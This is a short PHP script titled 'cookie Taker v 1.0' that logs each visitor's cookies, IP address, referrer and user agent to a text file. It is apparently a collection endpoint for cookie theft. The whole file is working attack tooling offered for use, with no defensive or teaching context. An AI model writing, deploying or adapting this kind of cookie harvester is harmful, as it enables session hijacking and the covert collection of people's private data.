<?php
###############################
#
#
#
# cookie Taker v 1.0
# Made By_ KHOOF_
#
#
################################
// Function to get the user's IP address
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

// Capture data
$cookie = $_COOKIE;
$ip = getUserIP();
$referrer = $_SERVER['HTTP_REFERER'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Create a log entry
$log_entry = "Cookie: " . print_r($cookie, true) . "\n";
$log_entry .= "IP Address: " . $ip . "\n";
$log_entry .= "Referrer: " . $referrer . "\n";
$log_entry .= "User Agent: " . $user_agent . "\n";
$log_entry .= "----------------------------------------\n";

// Log the data to a file
$file = fopen("loggs.txt", "a");
fwrite($file, $log_entry);
fclose($file);
?>
